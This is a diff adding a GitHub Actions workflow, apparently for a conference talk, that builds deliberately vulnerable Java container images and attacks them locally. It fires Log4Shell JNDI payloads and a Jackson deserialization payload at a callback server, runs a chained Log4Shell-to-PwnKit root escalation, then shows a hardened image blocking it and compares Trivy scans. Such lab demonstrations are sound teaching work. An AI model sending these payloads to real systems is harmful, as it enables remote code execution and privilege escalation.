@@ -1,0 +1,261 @@
+name: "🔓 Vulnerable App — Full Demo"
+
+# Automated security demo: builds all 3 images, exploits them, compares results.
+# Trigger manually via GitHub Actions UI during your conference talk.
+
+on:
+  workflow_dispatch:
+
+jobs:
+  # ═══════════════════════════════════════════════════════════════
+  demo-log4shell:
+    name: "💀 Demo 1 — Log4Shell (CVE-2021-44228)"
+    runs-on: ubuntu-latest
+    defaults:
+      run:
+        working-directory: "Vulnerable Application"
+
+    steps:
+      - uses: actions/checkout@v4
+
+      - name: "🏗️ Build image"
+        run: docker build -f Dockerfile.root -t vuln-app:root .
+
+      - name: "🚀 Start app + callback server"
+        run: |
+          cd "../Callback Server"
+          docker build -t callback-server .
+          docker run -d --name callback -p 9999:9999 callback-server
+          cd "../Vulnerable Application"
+          docker run -d --name vuln-app \
+            --add-host=host.docker.internal:host-gateway \
+            -p 8080:8080 vuln-app:root
+          for i in $(seq 1 30); do
+            curl -s http://localhost:8080/hello > /dev/null 2>&1 && break
+            sleep 2
+          done
+          echo "✅ App ready"
+
+      - name: "🎯 Normal product search"
+        run: |
+          echo "## Demo 1 — Log4Shell (CVE-2021-44228)" >> $GITHUB_STEP_SUMMARY
+          echo "### ✅ Normal Request" >> $GITHUB_STEP_SUMMARY
+          echo '```json' >> $GITHUB_STEP_SUMMARY
+          curl -s "http://localhost:8080/api/products/search?q=shirt" | python3 -m json.tool | tee -a $GITHUB_STEP_SUMMARY
+          echo '```' >> $GITHUB_STEP_SUMMARY
+
+      - name: "💀 Trigger JNDI lookup"
+        run: |
+          echo "### 💀 JNDI Injection Payload" >> $GITHUB_STEP_SUMMARY
+          echo 'Sending: `${jndi:ldap://callback:9999/log4shell-pwned}`' >> $GITHUB_STEP_SUMMARY
+          echo '```' >> $GITHUB_STEP_SUMMARY
+          # URL-encoded ${jndi:ldap://host.docker.internal:9999/log4shell-pwned}
+          curl -s "http://localhost:8080/api/products/search?q=%24%7Bjndi%3Aldap%3A%2F%2Fhost.docker.internal%3A9999%2Flog4shell-pwned%7D" || true
+          sleep 3
+          echo "App logs:" >> $GITHUB_STEP_SUMMARY
+          docker logs vuln-app 2>&1 | grep -i "jndi\|ldap\|lookup\|ERROR\|WARN" | tail -10 | tee -a $GITHUB_STEP_SUMMARY
+          echo '```' >> $GITHUB_STEP_SUMMARY
+          echo "" >> $GITHUB_STEP_SUMMARY
+          echo "### 📡 Callback Server Received:" >> $GITHUB_STEP_SUMMARY
+          echo '```json' >> $GITHUB_STEP_SUMMARY
+          curl -s http://localhost:9999/dashboard | python3 -m json.tool | tee -a $GITHUB_STEP_SUMMARY
+          echo '```' >> $GITHUB_STEP_SUMMARY
+
+      - name: "🧹 Cleanup"
+        if: always()
+        run: |
+          docker stop vuln-app callback 2>/dev/null || true
+          docker rm vuln-app callback 2>/dev/null || true
+
+  # ═══════════════════════════════════════════════════════════════
+  demo-jackson:
+    name: "💀 Demo 2 — Jackson Deserialization RCE"
+    runs-on: ubuntu-latest
+    defaults:
+      run:
+        working-directory: "Vulnerable Application"
+
+    steps:
+      - uses: actions/checkout@v4
+
+      - name: "🏗️ Build & start"
+        run: |
+          docker build -f Dockerfile.root -t vuln-app:root .
+          cd "../Callback Server" && docker build -t callback-server . && cd -
+          docker run -d --name callback -p 9999:9999 callback-server
+          docker run -d --name vuln-app --add-host=host.docker.internal:host-gateway -p 8080:8080 vuln-app:root
+          for i in $(seq 1 30); do curl -s http://localhost:8080/hello > /dev/null 2>&1 && break; sleep 2; done
+
+      - name: "🎯 Normal JSON import"
+        run: |
+          echo "## Demo 2 — Jackson Deserialization (CVE-2019-14379)" >> $GITHUB_STEP_SUMMARY
+          echo "### ✅ Normal Request" >> $GITHUB_STEP_SUMMARY
+          echo '```json' >> $GITHUB_STEP_SUMMARY
+          curl -s -X POST http://localhost:8080/api/users/import \
+            -H "Content-Type: application/json" \
+            -d '{"name":"Alice","email":"alice@conf.io"}' | python3 -m json.tool | tee -a $GITHUB_STEP_SUMMARY
+          echo '```' >> $GITHUB_STEP_SUMMARY
+
+      - name: "💀 Polymorphic deserialization attack"
+        run: |
+          echo "### 💀 Malicious Payload — Instantiate java.net.URL" >> $GITHUB_STEP_SUMMARY
+          echo '```json' >> $GITHUB_STEP_SUMMARY
+          curl -s -X POST http://localhost:8080/api/users/import \
+            -H "Content-Type: application/json" \
+            -d '["java.net.URL", "http://host.docker.internal:9999/jackson-rce-proof"]' | python3 -m json.tool | tee -a $GITHUB_STEP_SUMMARY
+          echo '```' >> $GITHUB_STEP_SUMMARY
+          sleep 2
+          echo "### 📡 Callback Server:" >> $GITHUB_STEP_SUMMARY
+          echo '```json' >> $GITHUB_STEP_SUMMARY
+          curl -s http://localhost:9999/dashboard | python3 -m json.tool | tee -a $GITHUB_STEP_SUMMARY
+          echo '```' >> $GITHUB_STEP_SUMMARY
+
+      - name: "🧹 Cleanup"
+        if: always()
+        run: docker stop vuln-app callback 2>/dev/null; docker rm vuln-app callback 2>/dev/null
+
+  # ═══════════════════════════════════════════════════════════════
+  demo-pwnkit:
+    name: "💀 Demo 3 — Full Chain: Log4Shell → RCE → PwnKit"
+    runs-on: ubuntu-latest
+    defaults:
+      run:
+        working-directory: "Vulnerable Application"
+
+    steps:
+      - uses: actions/checkout@v4
+
+      - name: "🏗️ Build all images"
+        run: |
+          docker build -f Dockerfile.escalation -t vuln-app:escalation .
+          docker build -f Dockerfile.nonroot -t vuln-app:safe .
+          cd "../Callback Server" && docker build -t callback-server .
+
+      - name: "🚀 Start attacker infrastructure + victim"
+        run: |
+          # Start attacker's server (HTTP + LDAP)
+          docker run -d --name callback -p 9999:9999 -p 1389:1389 callback-server
+          # Start victim (escalation image with trustURLCodebase=true)
+          docker run -d --name vuln-app \
+            --add-host=host.docker.internal:host-gateway \
+            -p 8080:8080 vuln-app:escalation
+          for i in $(seq 1 30); do curl -s http://localhost:8080/hello > /dev/null 2>&1 && break; sleep 2; done
+          echo "✅ Victim and attacker ready"
+
+      - name: "💀 THE ATTACK — Single HTTP request → root"
+        run: |
+          echo "## 💀 Demo 3 — Full Exploit Chain" >> $GITHUB_STEP_SUMMARY
+          echo "" >> $GITHUB_STEP_SUMMARY
+          echo "A SINGLE HTTP GET request chains:" >> $GITHUB_STEP_SUMMARY
+          echo "- Log4Shell (Java library CVE) → JNDI lookup" >> $GITHUB_STEP_SUMMARY
+          echo "- → Attacker's LDAP server → malicious class reference" >> $GITHUB_STEP_SUMMARY
+          echo "- → Victim loads & executes malicious class → downloads PwnKit" >> $GITHUB_STEP_SUMMARY
+          echo "- → PwnKit (OS package CVE) → privilege escalation to ROOT" >> $GITHUB_STEP_SUMMARY
+          echo "" >> $GITHUB_STEP_SUMMARY
+          
+          echo "### 💀 The Attack (one curl command)" >> $GITHUB_STEP_SUMMARY
+          echo '```bash' >> $GITHUB_STEP_SUMMARY
+          echo 'curl "http://victim:8080/api/products/search?q=${jndi:ldap://attacker:1389/pwnkit}"' >> $GITHUB_STEP_SUMMARY
+          echo '```' >> $GITHUB_STEP_SUMMARY
+          
+          # Fire the actual exploit
+          curl -s "http://localhost:8080/api/products/search?q=%24%7Bjndi%3Aldap%3A%2F%2Fhost.docker.internal%3A1389%2Fpwnkit%7D" || true
+          sleep 5
+          
+          echo "### 📡 Attacker's LDAP Server Logs" >> $GITHUB_STEP_SUMMARY
+          echo '```' >> $GITHUB_STEP_SUMMARY
+          docker logs callback 2>&1 | grep -i "LDAP\|exploit\|downloaded\|victim" | tee -a $GITHUB_STEP_SUMMARY
+          echo '```' >> $GITHUB_STEP_SUMMARY
+          
+          echo "### 🎯 Victim Container Logs (RCE evidence)" >> $GITHUB_STEP_SUMMARY
+          echo '```' >> $GITHUB_STEP_SUMMARY
+          docker logs vuln-app 2>&1 | grep -i "EXPLOIT\|uid=\|root\|pwnkit\|Running as" | tee -a $GITHUB_STEP_SUMMARY
+          echo '```' >> $GITHUB_STEP_SUMMARY
+
+      - name: "🔒 Same attack on safe image — blocked"
+        run: |
+          docker stop vuln-app; docker rm vuln-app
+          docker run -d --name vuln-app --add-host=host.docker.internal:host-gateway -p 8080:8080 vuln-app:safe
+          for i in $(seq 1 30); do curl -s http://localhost:8080/hello > /dev/null 2>&1 && break; sleep 2; done
+          
+          echo "### 🔒 Same Attack on Safe Image" >> $GITHUB_STEP_SUMMARY
+          curl -s "http://localhost:8080/api/products/search?q=%24%7Bjndi%3Aldap%3A%2F%2Fhost.docker.internal%3A1389%2Fpwnkit%7D" || true
+          sleep 3
+          
+          echo '```' >> $GITHUB_STEP_SUMMARY
+          echo "Victim logs (safe image):" >> $GITHUB_STEP_SUMMARY
+          docker logs vuln-app 2>&1 | tail -10 | tee -a $GITHUB_STEP_SUMMARY
+          echo '```' >> $GITHUB_STEP_SUMMARY
+          echo "" >> $GITHUB_STEP_SUMMARY
+          echo "✅ **JNDI lookup triggers but class loading is BLOCKED** — trustURLCodebase=false (modern default)" >> $GITHUB_STEP_SUMMARY
+          echo "" >> $GITHUB_STEP_SUMMARY
+          echo "Even if class loading worked: no gcc, no pkexec — exploitation impossible." >> $GITHUB_STEP_SUMMARY
+
+      - name: "🧹 Cleanup"
+        if: always()
+        run: docker stop vuln-app 2>/dev/null; docker rm vuln-app 2>/dev/null
+
+  # ═══════════════════════════════════════════════════════════════
+  scan-compare:
+    name: "📊 CVE Scan — Image Comparison"
+    runs-on: ubuntu-latest
+    defaults:
+      run:
+        working-directory: "Vulnerable Application"
+
+    steps:
+      - uses: actions/checkout@v4
+
+      - name: "🏗️ Build all images"
+        run: |
+          docker build -f Dockerfile.root -t vuln-app:root .
+          docker build -f Dockerfile.escalation -t vuln-app:escalation .
+          docker build -f Dockerfile.nonroot -t vuln-app:safe .
+
+      - name: "🔍 Install Trivy"
+        run: curl -sfL https://raw.githubusercontent.com/aquasecurity/trivy/main/contrib/install.sh | sh -s -- -b /usr/local/bin
+
+      - name: "📊 Scan & compare"
+        run: |
+          echo "## 📊 Image Security Comparison" >> $GITHUB_STEP_SUMMARY
+          echo "" >> $GITHUB_STEP_SUMMARY
+          
+          for IMG in root escalation safe; do
+            JSON=$(trivy image --format json --quiet "vuln-app:$IMG" 2>/dev/null)
+            TOTAL=$(echo "$JSON" | python3 -c "import json,sys; d=json.load(sys.stdin); print(sum(len(r.get('Vulnerabilities',[])) for r in d.get('Results',[])))" 2>/dev/null || echo "?")
+            CRIT=$(echo "$JSON" | python3 -c "import json,sys; d=json.load(sys.stdin); print(sum(1 for r in d.get('Results',[]) for v in r.get('Vulnerabilities',[]) if v.get('Severity')=='CRITICAL'))" 2>/dev/null || echo "?")
+            HIGH=$(echo "$JSON" | python3 -c "import json,sys; d=json.load(sys.stdin); print(sum(1 for r in d.get('Results',[]) for v in r.get('Vulnerabilities',[]) if v.get('Severity')=='HIGH'))" 2>/dev/null || echo "?")
+            SIZE=$(docker image inspect "vuln-app:$IMG" --format='{{.Size}}' | awk '{printf "%.0f", $1/1024/1024}')
+            
+            eval "${IMG}_TOTAL=$TOTAL"
+            eval "${IMG}_CRIT=$CRIT"
+            eval "${IMG}_HIGH=$HIGH"
+            eval "${IMG}_SIZE=$SIZE"
+          done
+          
+          echo "| Metric | 🔴 root | ⚠️ escalation | 🟢 safe |" >> $GITHUB_STEP_SUMMARY
+          echo "|--------|---------|--------------|---------|" >> $GITHUB_STEP_SUMMARY
+          echo "| Total CVEs | $root_TOTAL | $escalation_TOTAL | $safe_TOTAL |" >> $GITHUB_STEP_SUMMARY
+          echo "| CRITICAL | $root_CRIT | $escalation_CRIT | $safe_CRIT |" >> $GITHUB_STEP_SUMMARY
+          echo "| HIGH | $root_HIGH | $escalation_HIGH | $safe_HIGH |" >> $GITHUB_STEP_SUMMARY
+          echo "| Image Size | ${root_SIZE} MB | ${escalation_SIZE} MB | ${safe_SIZE} MB |" >> $GITHUB_STEP_SUMMARY
+          echo "| User | root | appuser | appuser |" >> $GITHUB_STEP_SUMMARY
+          echo "| Has pkexec (PwnKit) | ✅ | ✅ | ❌ |" >> $GITHUB_STEP_SUMMARY
+          echo "| Has gcc | ✅ | ✅ | ❌ |" >> $GITHUB_STEP_SUMMARY
+          echo "| Has curl/wget/nc | ✅ | ✅ | ❌ |" >> $GITHUB_STEP_SUMMARY
+          echo "| Base image | temurin:17.0.5 | temurin:17.0.5 | temurin:25 |" >> $GITHUB_STEP_SUMMARY
+          echo "" >> $GITHUB_STEP_SUMMARY
+          echo "### 🔴 Detailed scan — vuln-app:root" >> $GITHUB_STEP_SUMMARY
+          echo '```' >> $GITHUB_STEP_SUMMARY
+          trivy image --severity CRITICAL,HIGH --no-progress vuln-app:root 2>/dev/null | head -50 >> $GITHUB_STEP_SUMMARY
+          echo '```' >> $GITHUB_STEP_SUMMARY
+          echo "### 🟢 Detailed scan — vuln-app:safe" >> $GITHUB_STEP_SUMMARY
+          echo '```' >> $GITHUB_STEP_SUMMARY
+          trivy image --severity CRITICAL,HIGH --no-progress vuln-app:safe 2>/dev/null | head -50 >> $GITHUB_STEP_SUMMARY
+          echo '```' >> $GITHUB_STEP_SUMMARY
+
+
+
+
+
+
